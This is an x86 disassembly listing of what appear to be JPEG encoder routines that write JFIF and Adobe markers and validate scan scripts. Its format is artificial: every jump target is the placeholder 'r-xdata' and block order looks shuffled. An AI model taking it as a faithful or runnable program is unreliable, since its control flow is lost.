jmp r-xdata
mov edx [ esi ]
mov eax ebx
call sub_498928
mov edx [ esi + 0x8 ]
mov eax ebx
shl edx 0x4
add edx [ esi + 0xc ]
call sub_498928
mov edx [ esi + 0x10 ]
mov eax ebx
call sub_498928
inc edi
add esi 0x54
pop edi
pop esi
pop ebx
retn
sub_498c38
push ebx
push esi
push edi
push ebp
mov ebx eax
mov edx 0xda
mov eax ebx
call sub_498958
mov edx [ ebx + 0xf0 ]
mov eax ebx
add edx edx
add edx 0x6
call sub_498978
mov edx [ ebx + 0xf0 ]
mov eax ebx
call sub_498928
xor ebp ebp
lea edi [ ebx + 0xf4 ]
jmp r-xdata
cmp ebp [ ebx + 0xf0 ]
jl r-xdata
mov esi [ edi ]
mov eax ebx
mov edx [ esi ]
call sub_498928
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x18 ]
cmp [ ebx + 0xe0 ] 0x0
je r-xdata
mov edx [ ebx + 0x138 ]
mov eax ebx
call sub_498928
mov edx [ ebx + 0x13c ]
mov eax ebx
call sub_498928
mov edx [ ebx + 0x140 ]
mov eax ebx
shl edx 0x4
add edx [ ebx + 0x144 ]
call sub_498928
pop ebp
pop edi
pop esi
pop ebx
retn
shl eax 0x4
add edx eax
mov eax ebx
call sub_498928
inc ebp
add edi 0x4
cmp [ ebx + 0x138 ] 0x0
jne r-xdata
xor eax eax
xor edx edx
cmp [ ebx + 0x140 ] 0x0
je r-xdata
cmp [ ebx + 0xb0 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
sub_498d00
push ebx
mov ebx eax
mov edx 0xe0
mov eax ebx
call sub_498958
mov edx 0x10
mov eax ebx
call sub_498978
mov edx 0x4a
mov eax ebx
call sub_498928
mov edx 0x46
mov eax ebx
call sub_498928
mov edx 0x49
mov eax ebx
call sub_498928
mov edx 0x46
mov eax ebx
call sub_498928
xor edx edx
mov eax ebx
call sub_498928
xor edx edx
mov eax ebx
mov dl [ ebx + 0xd0 ]
call sub_498928
xor edx edx
mov eax ebx
mov dl [ ebx + 0xd1 ]
call sub_498928
xor edx edx
mov eax ebx
mov dl [ ebx + 0xd2 ]
call sub_498928
movzx edx [ ebx + 0xd4 ]
mov eax ebx
call sub_498978
movzx edx [ ebx + 0xd6 ]
mov eax ebx
call sub_498978
xor edx edx
mov eax ebx
call sub_498928
xor edx edx
mov eax ebx
call sub_498928
pop ebx
retn
sub_498db4
push ebx
mov ebx eax
mov edx 0xee
mov eax ebx
call sub_498958
mov edx 0xe
mov eax ebx
call sub_498978
mov edx 0x41
mov eax ebx
call sub_498928
mov edx 0x64
mov eax ebx
call sub_498928
mov edx 0x6f
mov eax ebx
call sub_498928
mov edx 0x62
mov eax ebx
call sub_498928
mov edx 0x65
mov eax ebx
call sub_498928
mov edx 0x64
mov eax ebx
call sub_498978
xor edx edx
mov eax ebx
call sub_498978
xor edx edx
mov eax ebx
call sub_498978
mov ecx [ ebx + 0x3c ]
sub ecx 0x3
je r-xdata
mov edx 0x1
mov eax ebx
call sub_498928
pop ebx
retn
sub ecx 0x2
je r-xdata
mov edx 0x2
mov eax ebx
call sub_498928
pop ebx
retn
jmp r-xdata
xor edx edx
mov eax ebx
call sub_498928
pop ebx
retn
sub_498e60
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
cmp esi 0xfffd
jbe r-xdata
mov edx edi
mov eax ebx
call sub_498958
lea edx [ esi + 0x2 ]
mov eax ebx
call sub_498978
pop edi
pop esi
pop ebx
retn
mov eax [ ebx ]
mov [ eax + 0x14 ] 0xb
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_498ea0
push ebx
mov ebx eax
push esi
mov eax ebx
mov esi [ ebx + 0x158 ]
mov edx 0xd8
call sub_498958
xor ecx ecx
mov [ esi + 0x1c ] ecx
cmp [ ebx + 0xcc ] 0x0
je r-xdata
cmp [ ebx + 0xd8 ] 0x0
je r-xdata
mov eax ebx
call sub_498d00
pop esi
pop ebx
retn
mov eax ebx
call sub_498db4
sub_498ee0
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
xor eax eax
mov [ esp ] eax
xor edi edi
mov esi [ ebx + 0x40 ]
jmp r-xdata
cmp edi [ ebx + 0x38 ]
jl r-xdata
mov edx [ esi + 0x10 ]
mov eax ebx
call sub_4989a4
add [ esp ] eax
inc edi
add esi 0x54
cmp [ ebx + 0xb0 ] 0x0
jne r-xdata
xor ebp ebp
jmp r-xdata
cmp [ ebx + 0xe0 ] 0x0
jne r-xdata
cmp [ ebx + 0xb0 ] 0x0
je r-xdata
cmp [ ebx + 0x34 ] 0x8
je r-xdata
cmp [ ebx + 0xe0 ] 0x0
je r-xdata
mov edx 0xc9
mov eax ebx
call sub_498b94
jmp r-xdata
mov ebp 0x1
xor edi edi
mov esi [ ebx + 0x40 ]
jmp r-xdata
test ebp ebp
je r-xdata
mov edx 0xc2
mov eax ebx
call sub_498b94
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ ebx + 0x38 ]
jl r-xdata
mov edx 0xc1
mov eax ebx
call sub_498b94
mov edx 0xc0
mov eax ebx
call sub_498b94
jmp r-xdata
cmp [ esi + 0x14 ] 0x1
jg r-xdata
cmp [ esp ] 0x0
je r-xdata
xor ebp ebp
cmp [ esi + 0x18 ] 0x1
jle r-xdata
test ebp ebp
je r-xdata
inc edi
add esi 0x54
xor ebp ebp
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x4b
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
sub_498fb8
push ebx
push esi
mov ebx eax
push edi
push ebp
push ecx
mov eax [ ebx + 0x158 ]
mov [ esp ] eax
cmp [ ebx + 0xb0 ] 0x0
je r-xdata
xor ebp ebp
lea edi [ ebx + 0xf4 ]
jmp r-xdata
mov eax ebx
call sub_498b64
jmp r-xdata
cmp ebp [ ebx + 0xf0 ]
jl r-xdata
mov eax [ esp ]
mov edx [ eax + 0x1c ]
cmp edx [ ebx + 0xc4 ]
je r-xdata
cmp [ ebx + 0xe0 ] 0x0
mov esi [ edi ]
je r-xdata
mov eax ebx
call sub_498c38
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_498b68
mov edx [ esp ]
mov ecx [ ebx + 0xc4 ]
mov [ edx + 0x1c ] ecx
xor ecx ecx
mov edx [ esi + 0x14 ]
mov eax ebx
call sub_498a88
mov ecx 0x1
mov edx [ esi + 0x18 ]
mov eax ebx
call sub_498a88
cmp [ ebx + 0x138 ] 0x0
jne r-xdata
mov ecx 0x1
mov edx [ esi + 0x18 ]
mov eax ebx
call sub_498a88
jmp r-xdata
cmp [ ebx + 0x140 ] 0x0
jne r-xdata
inc ebp
add edi 0x4
xor ecx ecx
mov edx [ esi + 0x14 ]
mov eax ebx
call sub_498a88
jmp r-xdata
sub_499084
push ebx
push esi
push edi
mov edi eax
mov edx 0xd8
mov eax edi
call sub_498958
xor ebx ebx
lea esi [ edi + 0x44 ]
inc ebx
add esi 0x4
cmp ebx 0x4
jl r-xdata
mov edx ebx
mov eax edi
call sub_4989a4
cmp [ esi ] 0x0
je r-xdata
cmp [ edi + 0xb0 ] 0x0
jne r-xdata
mov edx 0xd9
mov eax edi
call sub_498958
pop edi
pop esi
pop ebx
retn
xor ebx ebx
lea esi [ edi + 0x54 ]
cmp [ esi + 0x10 ] 0x0
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
call sub_498a88
inc ebx
add esi 0x4
cmp ebx 0x4
jl r-xdata
mov ecx 0x1
mov edx ebx
mov eax edi
call sub_498a88
cmp [ esi ] 0x0
je r-xdata
sub_4990fc
push ebx
mov ebx eax
mov eax ebx
push esi
mov ecx 0x20
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov [ ebx + 0x158 ] eax
mov [ eax ] sub_498ea0
mov [ eax + 0x4 ] sub_498ee0
mov [ eax + 0x8 ] sub_498fb8
mov [ eax + 0xc ] sub_499078
mov [ eax + 0x10 ] sub_499084
mov [ eax + 0x14 ] sub_498e60
mov [ eax + 0x18 ] sub_498e98
xor edx edx
mov [ eax + 0x1c ] edx
pop esi
pop ebx
retn
sub_499150
push ebx
mov ebx eax
push esi
push edi
cmp [ ebx + 0x20 ] 0x0
jbe r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x20
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x1c ] 0x0
jbe r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x29
mov [ eax + 0x18 ] 0xffdc
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x1c ] 0xffdc
jle r-xdata
cmp [ ebx + 0x38 ] 0x0
jle r-xdata
cmp [ ebx + 0x34 ] 0x8
je r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x46
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x1c ]
imul [ ebx + 0x24 ]
mov edx eax
cmp eax edx
je r-xdata
cmp [ ebx + 0x24 ] 0x0
jg r-xdata
cmp [ ebx + 0x38 ] 0xa
jle r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0xf
mov edx [ ebx + 0x34 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x20 ] 0xffdc
jg r-xdata
mov [ ebx + 0xe4 ] 0x1
mov [ ebx + 0xe8 ] 0x1
xor edi edi
mov esi [ ebx + 0x40 ]
jmp r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x1a
mov edx [ ebx + 0x38 ]
mov [ eax + 0x18 ] edx
mov [ eax + 0x1c ] 0xa
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp edi [ ebx + 0x38 ]
jl r-xdata
mov eax [ esi + 0x8 ]
test eax eax
jle r-xdata
xor edi edi
mov esi [ ebx + 0x40 ]
jmp r-xdata
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x12
mov edx [ eax ]
call [ edx ]
cmp eax 0x4
jg r-xdata
cmp edi [ ebx + 0x38 ]
jl r-xdata
mov eax [ esi + 0x8 ]
mov eax [ ebx + 0xe4 ]
jmp r-xdata
cmp [ esi + 0xc ] 0x0
jle r-xdata
mov [ esi + 0x4 ] edi
mov [ esi + 0x24 ] 0x8
mov edx [ ebx + 0xe4 ]
shl edx 0x3
mov eax [ ebx + 0x1c ]
imul eax [ esi + 0x8 ]
call sub_497748
mov [ esi + 0x1c ] eax
mov edx [ ebx + 0xe8 ]
shl edx 0x3
mov eax [ ebx + 0x20 ]
imul eax [ esi + 0xc ]
call sub_497748
mov [ esi + 0x20 ] eax
mov eax [ ebx + 0x1c ]
imul [ esi + 0x8 ]
mov edx [ ebx + 0xe4 ]
call sub_497748
mov [ esi + 0x28 ] eax
mov eax [ ebx + 0x20 ]
imul [ esi + 0xc ]
mov edx [ ebx + 0xe8 ]
call sub_497748
mov [ esi + 0x2c ] eax
inc edi
mov [ esi + 0x30 ] 0x1
add esi 0x54
mov edx [ ebx + 0xe8 ]
mov eax [ ebx + 0x20 ]
shl edx 0x3
call sub_497748
mov [ ebx + 0xec ] eax
pop edi
pop esi
pop ebx
retn
mov ecx [ esi + 0xc ]
mov ecx [ ebx + 0xe8 ]
jmp r-xdata
mov [ ebx + 0xe4 ] eax
mov edx [ ebx + 0xe8 ]
cmp edx [ esi + 0xc ]
jle r-xdata
cmp [ esi + 0xc ] 0x4
jle r-xdata
mov [ ebx + 0xe8 ] ecx
inc edi
add esi 0x54
mov ecx [ ebx + 0xe4 ]
cmp ecx [ esi + 0x8 ]
jle r-xdata
sub_499314
push ebx
push esi
push edi
mov esi eax
push ebp
add esp 0xfffff5b8
cmp [ esi + 0xa4 ] 0x0
jg r-xdata
mov ecx [ esi + 0xa8 ]
mov [ esp ] ecx
mov eax [ esp ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ esi ]
xor ecx ecx
mov [ eax + 0x14 ] 0x13
mov edx [ esi ]
mov eax esi
mov [ edx + 0x18 ] ecx
mov edx [ eax ]
call [ edx ]
mov [ esi + 0xe0 ] 0x1
lea ebx [ esp + 0x48 ]
xor eax eax
mov [ esp + 0xc ] eax
jmp r-xdata
mov edx [ esp ]
cmp [ edx + 0x18 ] 0x3f
je r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esi + 0x38 ]
jl r-xdata
xor edx edx
xor ecx ecx
mov [ esi + 0xe0 ] edx
mov [ esp + 0xc ] ecx
lea eax [ esp + 0x20 ]
jmp r-xdata
xor edi edi
jmp r-xdata
mov ecx [ esp + 0xc ]
cmp ecx [ esi + 0x38 ]
jl r-xdata
mov [ ebx ] 0xffffffff
add ebx 0x4
inc edi
cmp edi 0x40
jl r-xdata
inc [ esp + 0xc ]
mov [ esp + 0x4 ] 0x1
jmp r-xdata
xor edx edx
mov [ eax ] edx
inc [ esp + 0xc ]
add eax 0x4
mov eax [ esp + 0x4 ]
cmp eax [ esi + 0xa4 ]
jle r-xdata
mov eax [ esp ]
mov edx [ eax ]
mov [ esp + 0x8 ] edx
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esi + 0xe0 ] 0x0
je r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x1a
mov edx [ esp + 0x8 ]
mov [ eax + 0x18 ] edx
mov [ eax + 0x1c ] 0x4
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp [ esp + 0x8 ] 0x4
jle r-xdata
xor eax eax
lea ebx [ esp + 0x20 ]
mov [ esp + 0xc ] eax
jmp r-xdata
xor edx edx
lea ebx [ esp + 0x48 ]
mov [ esp + 0xc ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ eax + 0x14 ]
mov [ esp + 0x10 ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x18 ]
mov [ esp + 0x14 ] eax
mov edx [ esp ]
mov eax [ esp ]
mov ebp [ edx + 0x1c ]
mov edx [ eax + 0x20 ]
mov [ esp + 0x18 ] edx
cmp [ esi + 0xe0 ] 0x0
je r-xdata
mov ebx [ edi ]
test ebx ebx
jl r-xdata
xor ecx ecx
mov [ esp + 0xc ] ecx
mov eax [ esp ]
lea edi [ eax + 0x4 ]
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x8 ]
jge r-xdata
mov ecx [ esp + 0xc ]
cmp ecx [ esi + 0x38 ]
jl r-xdata
mov ecx [ esp + 0xc ]
cmp ecx [ esi + 0x38 ]
jl r-xdata
cmp [ esp + 0x10 ] 0x0
jne r-xdata
cmp [ esp + 0x10 ] 0x0
jl r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x13
mov edx [ esp + 0x4 ]
mov [ eax + 0x18 ] edx
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp ebx [ esi + 0x38 ]
jl r-xdata
cmp [ ebx ] 0x0
jne r-xdata
add esp 0xa48
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
jge r-xdata
jmp r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x11
mov edx [ esp + 0x4 ]
mov [ eax + 0x18 ] edx
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp [ esp + 0x14 ] 0x3f
jne r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x11
mov edx [ esp + 0x4 ]
mov [ eax + 0x18 ] edx
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp [ esp + 0x10 ] 0x40
jge r-xdata
inc [ esp + 0xc ]
add edi 0x4
mov ecx [ esp + 0xc ]
cmp ecx [ esp + 0x8 ]
jl r-xdata
cmp ebx [ edi - 0x4 ]
jg r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
inc [ esp + 0xc ]
add ebx 0x4
mov eax [ esi ]
mov [ eax + 0x14 ] 0x2d
mov eax esi
mov edx [ eax ]
call [ edx ]
inc [ esp + 0xc ]
add ebx 0x100
mov eax [ esi ]
mov [ eax + 0x14 ] 0x2d
mov eax esi
mov edx [ eax ]
call [ edx ]
add [ esp ] 0x24
inc [ esp + 0x4 ]
mov ebx [ edi ]
cmp [ esp + ebx * 4 + 0x20 ] 0x0
je r-xdata
test ebp ebp
jne r-xdata
cmp [ esp + 0x8 ] 0x1
je r-xdata
cmp [ esp + 0x14 ] 0x0
je r-xdata
mov ecx [ esp + 0x14 ]
cmp ecx [ esp + 0x10 ]
jl r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x13
mov edx [ esp + 0x4 ]
mov [ eax + 0x18 ] edx
mov eax esi
mov edx [ eax ]
call [ edx ]
mov [ esp + ebx * 4 + 0x20 ] 0x1
inc [ esp + 0xc ]
add edi 0x4
mov ecx [ esp + 0xc ]
cmp ecx [ esp + 0x8 ]
jl r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x13
mov edx [ esp + 0x4 ]
mov [ eax + 0x18 ] edx
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp [ esp + 0x18 ] 0x0
je r-xdata
xor ecx ecx
mov [ esp + 0xc ] ecx
mov eax [ esp ]
lea edx [ eax + 0x4 ]
mov [ esp + 0x1c ] edx
mov ecx [ esp + 0xc ]
cmp ecx [ esp + 0x8 ]
jge r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x11
mov edx [ esp + 0x4 ]
mov [ eax + 0x18 ] edx
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi ]
mov [ eax + 0x14 ] 0x11
mov edx [ esp + 0x4 ]
mov [ eax + 0x18 ] edx
mov eax esi
mov edx [ eax ]
call [ edx ]
jmp r-xdata
cmp [ esp + 0x14 ] 0x40
jge r-xdata
xor ecx ecx
mov [ esp + 0xc ] ecx
mov eax [ esp ]
lea edi [ eax + 0x4 ]
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x8 ]
jge r-xdata
mov eax [ esp + 0x1c ]
mov ebx [ eax ]
shl ebx 0x8
lea eax [ esp + 0x48 ]
add ebx eax
cmp [ esp + 0x10 ] 0x0
je r-xdata
test ebp ebp
jl r-xdata
mov edi [ esp + 0x10 ]
cmp edi [ esp + 0x14 ]
lea eax [ ebx + edi * 4 ]
mov ebx eax
jg r-xdata
cmp [ ebx ] 0x0
jge r-xdata
cmp ebp 0xa
jg r-xdata
inc [ esp + 0xc ]
add [ esp + 0x1c ] 0x4
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x8 ]
jl r-xdata
cmp [ ebx ] 0x0
jge r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x11
mov edx [ esp + 0x4 ]
mov [ eax + 0x18 ] edx
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp [ esp + 0x18 ] 0x0
jl r-xdata
jmp r-xdata
cmp ebp [ ebx ]
jne r-xdata
test ebp ebp
je r-xdata
cmp [ esp + 0x18 ] 0xa
jle r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x11
mov edx [ esp + 0x4 ]
mov [ eax + 0x18 ] edx
mov eax esi
mov edx [ eax ]
call [ edx ]
lea ecx [ ebp - 0x1 ]
cmp ecx [ esp + 0x18 ]
je r-xdata
mov ecx [ esp + 0x18 ]
inc edi
mov [ ebx ] ecx
add ebx 0x4
cmp edi [ esp + 0x14 ]
jle r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x11
mov edx [ esp + 0x4 ]
mov [ eax + 0x18 ] edx
mov eax esi
mov edx [ eax ]
call [ edx ]
jmp r-xdata
cmp [ esp + 0x10 ] 0x0
jne r-xdata
sub_4996fc
push ebx
mov ebx eax
push esi
push edi
push ebp
mov edx [ ebx + 0xa8 ]
test edx edx
je r-xdata
cmp [ ebx + 0x38 ] 0x4
jle r-xdata
mov eax [ ebx + 0x148 ]
lea esi [ ebx + 0xf4 ]
mov ecx [ eax + 0x20 ]
shl ecx 0x2
lea ecx [ ecx + ecx * 8 ]
add ecx edx
mov edx ecx
mov eax [ edx ]
lea ecx [ edx + 0x4 ]
mov [ ebx + 0xf0 ] eax
xor eax eax
jmp r-xdata
mov ecx [ ebx + 0x38 ]
mov [ ebx + 0xf0 ] ecx
xor eax eax
lea edx [ ebx + 0xf4 ]
jmp r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x1a
mov edx [ ebx + 0x38 ]
mov [ eax + 0x18 ] edx
mov [ eax + 0x1c ] 0x4
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp eax [ edx ]
jl r-xdata
cmp eax [ ebx + 0x38 ]
jl r-xdata
mov edi [ ecx ]
inc eax
mov ebp edi
lea edi [ ebp + edi * 4 ]
lea edi [ ebp + edi * 4 ]
shl edi 0x2
add edi [ ebx + 0x40 ]
mov [ esi ] edi
add esi 0x4
add ecx 0x4
mov eax [ edx + 0x14 ]
mov [ ebx + 0x138 ] eax
mov ecx [ edx + 0x18 ]
mov [ ebx + 0x13c ] ecx
mov eax [ edx + 0x1c ]
mov [ ebx + 0x140 ] eax
mov edx [ edx + 0x20 ]
mov [ ebx + 0x144 ] edx
jmp r-xdata
lea ecx [ eax + eax * 4 ]
lea ecx [ eax + ecx * 4 ]
inc eax
shl ecx 0x2
add ecx [ ebx + 0x40 ]
mov [ edx ] ecx
add edx 0x4
xor eax eax
xor edx edx
mov [ ebx + 0x138 ] eax
xor ecx ecx
mov [ ebx + 0x13c ] 0x3f
mov [ ebx + 0x140 ] edx
mov [ ebx + 0x144 ] ecx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4997ec
push ebx
mov ebx eax
push esi
push edi
push ecx
cmp [ ebx + 0xf0 ] 0x1
jne r-xdata
mov eax [ ebx + 0xf0 ]
test eax eax
jle r-xdata
mov ecx [ ebx + 0xf4 ]
mov eax [ ecx + 0x1c ]
mov [ ebx + 0x104 ] eax
mov edx [ ecx + 0x20 ]
mov [ ebx + 0x108 ] edx
xor edx edx
mov [ ecx + 0x34 ] 0x1
mov [ ecx + 0x38 ] 0x1
mov [ ecx + 0x3c ] 0x1
mov [ ecx + 0x40 ] 0x8
mov [ ecx + 0x44 ] 0x1
mov eax [ ecx + 0x20 ]
mov esi [ ecx + 0xc ]
div esi
mov eax edx
test eax eax
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x1a
mov edx [ ebx + 0xf0 ]
mov [ eax + 0x18 ] edx
mov [ eax + 0x1c ] 0x4
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp eax 0x4
jle r-xdata
mov [ ecx + 0x48 ] eax
xor edx edx
mov [ ebx + 0x10c ] 0x1
mov [ ebx + 0x110 ] edx
jmp r-xdata
mov eax esi
cmp esi [ ebx + 0xf0 ]
jl r-xdata
mov edx [ ebx + 0xe4 ]
mov eax [ ebx + 0x1c ]
shl edx 0x3
call sub_497748
mov [ ebx + 0x104 ] eax
mov edx [ ebx + 0xe8 ]
mov eax [ ebx + 0x20 ]
shl edx 0x3
call sub_497748
mov [ ebx + 0x108 ] eax
xor ecx ecx
mov [ ebx + 0x10c ] ecx
xor esi esi
lea eax [ ebx + 0xf4 ]
mov [ esp ] eax
jmp r-xdata
mov eax [ ebx + 0xc8 ]
test eax eax
jle r-xdata
mov edx [ esp ]
mov ecx [ edx ]
mov eax [ ecx + 0x8 ]
mov [ ecx + 0x34 ] eax
mov eax [ ecx + 0xc ]
mov [ ecx + 0x38 ] eax
mov edx [ ecx + 0x34 ]
imul edx eax
mov [ ecx + 0x3c ] edx
xor edx edx
mov eax [ ecx + 0x34 ]
shl eax 0x3
mov [ ecx + 0x40 ] eax
mov eax [ ecx + 0x1c ]
mov edi [ ecx + 0x34 ]
div edi
mov eax edx
test eax eax
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
imul [ ebx + 0x104 ]
cmp eax 0xffff
jl r-xdata
mov [ ecx + 0x44 ] eax
xor edx edx
mov eax [ ecx + 0x20 ]
mov edi [ ecx + 0x38 ]
div edi
mov eax edx
test eax eax
jne r-xdata
mov eax edi
mov [ ebx + 0xc4 ] eax
mov eax 0xffff
mov [ ecx + 0x48 ] eax
mov edi [ ecx + 0x3c ]
mov eax [ ebx + 0x10c ]
add eax edi
cmp eax 0xa
jle r-xdata
mov eax edi
mov eax edi
add edi 0xffffffff
test eax eax
jg r-xdata
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0xd
mov edx [ eax ]
call [ edx ]
jmp r-xdata
mov ecx [ ebx + 0x10c ]
inc [ ebx + 0x10c ]
mov [ ebx + ecx * 4 + 0x110 ] esi
inc esi
add [ esp ] 0x4
sub_499998
push ebx
mov ebx eax
push esi
mov esi [ ebx + 0x148 ]
mov eax [ esi + 0x14 ]
sub eax 0x1
jb r-xdata
mov eax ebx
call sub_4996fc
mov eax ebx
call sub_4997ec
cmp [ ebx + 0xac ] 0x0
jne r-xdata
je r-xdata
mov eax ebx
mov edx [ eax + 0x164 ]
call [ edx ]
mov edx [ ebx + 0xb4 ]
mov eax ebx
mov ecx [ eax + 0x168 ]
call [ ecx ]
cmp [ esi + 0x1c ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax + 0x15c ]
call [ edx ]
mov eax ebx
mov edx [ eax + 0x160 ]
call [ edx ]
xor edx edx
mov eax ebx
mov ecx [ eax + 0x150 ]
call [ ecx ]
mov eax ebx
call sub_4996fc
mov eax ebx
call sub_4997ec
cmp [ ebx + 0x138 ] 0x0
jne r-xdata
dec eax
je r-xdata
xor edx edx
mov edx 0x3
jmp r-xdata
mov edx 0x1
mov eax ebx
mov ecx [ eax + 0x168 ]
call [ ecx ]
mov edx 0x2
mov eax ebx
mov ecx [ eax + 0x154 ]
call [ ecx ]
xor edx edx
mov [ esi + 0xc ] edx
jmp r-xdata
cmp [ ebx + 0x140 ] 0x0
je r-xdata
cmp [ ebx + 0xb4 ] 0x0
jne r-xdata
jmp r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
xor eax eax
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax ebx
mov ecx [ eax + 0x154 ]
call [ ecx ]
xor edx edx
mov eax ebx
mov ecx [ eax + 0x14c ]
call [ ecx ]
cmp [ ebx + 0xb4 ] 0x0
je r-xdata
mov ecx [ esi + 0x1c ]
dec ecx
cmp ecx [ esi + 0x18 ]
sete al
and eax 0x1
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
cmp [ ebx + 0xb0 ] 0x0
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax + 0x168 ]
call [ ecx ]
mov edx 0x2
mov eax ebx
mov ecx [ eax + 0x154 ]
call [ ecx ]
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov eax ebx
call sub_4996fc
mov eax ebx
call sub_4997ec
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x30
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop esi
pop ebx
retn
mov edx [ esi + 0x18 ]
mov [ eax + 0xc ] edx
mov ecx [ esi + 0x1c ]
mov [ eax + 0x10 ] ecx
mov [ esi + 0x14 ] 0x2
inc [ esi + 0x18 ]
mov eax ebx
mov edx [ eax + 0x158 ]
call [ edx + 0x8 ]
xor ecx ecx
mov [ esi + 0xc ] ecx
jmp r-xdata
mov eax ebx
mov edx [ eax + 0x158 ]
call [ edx + 0x4 ]
sub_499b34
push ebx
mov ebx eax
mov eax [ ebx + 0x148 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
mov edx [ eax + 0x158 ]
call [ edx + 0x4 ]
mov eax ebx
mov edx [ eax + 0x158 ]
call [ edx + 0x8 ]
pop ebx
retn
sub_499b5c
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x148 ]
mov eax esi
mov edx [ eax + 0x168 ]
call [ edx + 0x8 ]
mov ecx [ ebx + 0x14 ]
sub ecx 0x1
jb r-xdata
mov [ ebx + 0x14 ] 0x2
cmp [ esi + 0xb4 ] 0x0
jne r-xdata
je r-xdata
inc [ ebx + 0x18 ]
pop esi
pop ebx
retn
inc [ ebx + 0x20 ]
jmp r-xdata
mov [ ebx + 0x14 ] 0x2
jmp r-xdata
dec ecx
je r-xdata
cmp [ esi + 0xb4 ] 0x0
je r-xdata
jmp r-xdata
inc [ ebx + 0x20 ]
mov [ ebx + 0x14 ] 0x1
sub_499bb8
push ebx
push esi
mov esi eax
push edi
mov eax esi
mov edi edx
mov edx 0x1
mov ecx 0x24
mov ebx [ eax + 0x4 ]
call [ ebx ]
mov ebx eax
xor eax eax
mov [ esi + 0x148 ] ebx
mov [ ebx ] sub_499998
mov [ ebx + 0x4 ] sub_499b34
mov [ ebx + 0x8 ] sub_499b5c
mov [ ebx + 0x10 ] eax
mov eax esi
call sub_499150
cmp [ esi + 0xa8 ] 0x0
je r-xdata
xor edx edx
mov [ esi + 0xe0 ] edx
mov [ esi + 0xa4 ] 0x1
mov eax esi
call sub_499314
jmp r-xdata
test edi edi
je r-xdata
mov [ esi + 0xb4 ] 0x1
cmp [ esi + 0xe0 ] 0x0
je r-xdata
xor ecx ecx
mov [ ebx + 0x14 ] ecx
cmp [ esi + 0xb4 ] 0x0
je r-xdata
mov eax [ esi + 0xa4 ]
mov [ ebx + 0x1c ] eax
mov ecx [ esi + 0xa4 ]
add ecx ecx
mov [ ebx + 0x1c ] ecx
jmp r-xdata
mov [ ebx + 0x14 ] 0x2
jmp r-xdata
mov [ ebx + 0x14 ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
xor edx edx
mov [ ebx + 0x20 ] eax
mov [ ebx + 0x18 ] edx
cmp [ esi + 0xb4 ] 0x0
je r-xdata
sub_499c80
push ebx
cmp [ eax + 0xac ] 0x0
mov ecx [ eax + 0x14c ]
jne r-xdata
pop ebx
retn
